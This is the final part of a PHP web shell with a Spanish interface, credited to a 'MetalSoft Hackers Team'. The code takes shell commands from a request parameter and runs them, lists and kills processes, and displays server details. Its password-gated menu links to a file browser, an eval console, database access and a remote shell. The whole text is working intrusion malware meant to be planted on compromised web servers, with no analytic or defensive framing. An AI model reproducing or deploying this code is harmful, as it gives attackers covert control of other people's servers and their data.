						foreach($psln as $p){
							$s_result .= "<th>".trim(trim(strtolower($p)),"\"")."</th>";
						}
						$s_result .= "</tr>";
					}
					else{
						$psln = explode($wexplode,$psa,$wcount);
						$s_result .= "<tr>";
						$tblcount = 0;
						foreach($psln as $p){
							if(trim($p)=="") $p = "&nbsp;";
							if($tblcount == 0){
								$s_result .= "<td style=\"text-align:center;\"><a href=\"?ps&amp;d=".$pwd."&amp;pid=".trim(trim($psln[1]),"\"")."\">kill</a></td>
										<td style=\"text-align:center;\">".trim(trim($p),"\"")."</td>";
								$tblcount++;
							}
							else{
								$tblcount++;
								if($tblcount == count($psln)) $s_result .= "<td style=\"text-align:left;\">".trim(trim($p), "\"")."</td>";
								else $s_result .= "<td style=\"text-align:center;\">".trim(trim($p), "\"")."</td>";
							}
						}
						$s_result .= "</tr>";
					}
				}
			}
			$s_result .= "</table>";
		}
	}
	else{
		if(isset($_REQUEST['cmd'])){
			$cmd = ss($_REQUEST['cmd']);
			if(strlen($cmd) > 0){
				if(preg_match('#^cd(\ )+(.*)$#',$cmd,$r)){
					$nd = trim($r[2]);
					if(is_dir($nd)){
						chdir($nd);
						$pwd = cp(getcwd());
						$s_result .= showdir($pwd,$s_prompt,$s_win);
					}
					elseif(is_dir($pwd.$nd)){
						chdir($pwd.$nd);
						$pwd = cp(getcwd());
						$s_result .= showdir($pwd,$s_prompt,$s_win);
					}
					else $s_result .= "<pre>".$nd." is not a directory"."</pre>";
				}
				else{
					$s_r = htmlspecialchars(exe($cmd));
					if($s_r != '') $s_result .= "<pre>".$s_r."</pre>";
					else $s_result .= showdir($pwd,$s_prompt,$s_win);
				}
			}
			else $s_result .= showdir($pwd,$s_prompt,$s_win);
		}
		else $s_result .= showdir($pwd,$s_prompt,$s_win);
	}


	// print useful info
	$s_info  = "<table class=\"headtbl\"><tr><td>".$s_software."</td></tr>";
	$s_info .= "<tr><td>".$s_system."</td></tr>";
	if($s_id != "") $s_info .= "<tr><td>".$s_id."</td></tr>";
	$s_info .= "<tr><td>IP del servidor : ".$s_server_ip."<span class=\"gaya\"> | </span>TU IP : ".$s_my_ip."<span class=\"gaya\"> | </span>";
	if($s_safemode) $s_info .= "safemode <span class=\"gaya\">ON</span>";
	else $s_info .= "safemode <span class=\"gaya\">OFF</span>";
	$s_info .= "
		</td></tr>
		<tr><td style=\"text-align:left;\">
			<table class=\"headtbls\"><tr>
			<td>".trim($letters)."</td>
			<td>
			<span id=\"chpwd\">&nbsp;<a href=\"javascript:tukar('chpwd','chpwdform');\">&gt;&nbsp;&nbsp;</a>".swd($pwd)."</span>
			<form action=\"?\" method=\"get\" style=\"margin:0;padding:0;\">
			<span class=\"sembunyi\" id=\"chpwdform\">
			&nbsp;<a href=\"javascript:tukar('chpwdform','chpwd');\">&gt;</a>&nbsp;&nbsp;
			<input type=\"hidden\" name=\"d\" class=\"inputz\" style=\"width:300px;\" value=\"".cp($pwd)."\" />
			<input type=\"text\" name=\"view\" class=\"inputz\" style=\"width:300px;\" value=\"".$pwd."\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"submit\" value=\"view\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('chpwdform','chpwd');\" />
			</form>
			</span>
			</td></tr>
			</table>
		</td></tr>
		</table>";
}
// OK now... thats the <brain>,, here comes the <head>
?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">

<head>
<title><?php echo $s_title; ?></title>
<link rel="SHORTCUT ICON" href="<?php echo $_SERVER['SCRIPT_NAME']."?favicon"; ?>" />

<style type="text/css"><?php echo gzinflate(base64_decode($style)); ?></style>

<script type="text/javascript" src="<?php echo $_SERVER['SCRIPT_NAME']."?sorttable"; ?>"></script>
<script type="text/javascript">
function tukar(l,b){
	if(document.getElementById(l)) document.getElementById(l).style.display = 'none';
	if(document.getElementById(b)) document.getElementById(b).style.display = 'block';
}
function init(){
	<?php if(isset($_REQUEST['cmd'])) echo "if(document.getElementById('cmd')) document.getElementById('cmd').focus();"; ?>
}
</script>

</head>

<body onLoad="init();">
<table id="main"><tr><td><?php if($s_auth){ ?>
	<div><table id="header"><tr><td><table><tr><td><h1><a href="?"><?php echo $s_name; ?></a></h1></td></tr><tr><td style="text-align:right;"><div class="ver"><?php echo $s_ver; ?></div></td></tr></table></td>
	<td><div class="headinfo"><?php echo $s_info; ?></div></td></tr></table>
	</div>
	<div style="clear:both;"></div>
	<div id="menu">
		<table style="width:100%;"><tr>
		<td><a href="?&d=<?php echo $pwd; ?>" title="Explorar directorio"><div class="menumi">Explorar</div></a></td>
		<td><a href="?ps&d=<?php echo $pwd; ?>" title="Ver procesos"><div class="menumi">Procesos</div></a></td>
		<td><a href="?eval&d=<?php echo $pwd; ?>" title="Funcion Eval"><div class="menumi">Eval</div></a></td>
		<td><a href="?phpinfo&d=<?php echo $pwd; ?>" title="Ver informacion del sistema"><div class="menumi">phpInfo</div></a></td>
		<td><a href="?db&d=<?php echo $pwd; ?>" title="Conectarse a las Bases de datos"><div class="menumi">Bases</div></a></td>
		<td><a href="?rs&d=<?php echo $pwd; ?>" title="Shell Remota"><div class="menumi">Remota</div></a></td>
		<td style="width:100%;padding:0 0 0 6px;">
		<form action="?" method="get"><span class="prompt"><?php echo $s_prompt; ?></span>
		<input id="cmd" class="inputz" type="text" name="cmd" style="width:70%;" value="" />
		<noscript><input class="inputzbut" type="submit" value="Ir !" name="submitcmd" style="width:80px;" /></noscript>
		<input type="hidden" name="d" value="<?php echo $pwd; ?>" />
		</form>
		</td>
		</tr>
		</table>
	</div>
	<div id="content" id="box_shell">
		<div id="result"><?php echo $s_result; ?></div>
	</div><?php } 
else{ ?>
<center>Sistema de acceso</center></p>
<p>
<center>Ingrese su clave</center>
	<div style="width:100%;text-align:center;">
	
	<form action="?" method="post">
	<img src="?favicon" style="margin:2px;vertical-align:middle;" />
	<?php echo $s_name; ?>&nbsp;<span class="gaya"><?php echo $s_ver; ?></span><input id="login" class="inputz" type="password" name="login" style="width:120px;" value="" />
	<input class="inputzbut" type="submit" value="ENTRAR" name="submitlogin" style="width:80px;" />
	</form>
	</div>
<p>
<center>MetalSoft Hackers Team </center>
</p>
<?php
}
?>
</td></tr></table>
<p class="footer">Fail.root[at]Hotmail.com | MetalSoft Hackers Team &copy;</p>
</body>
</html>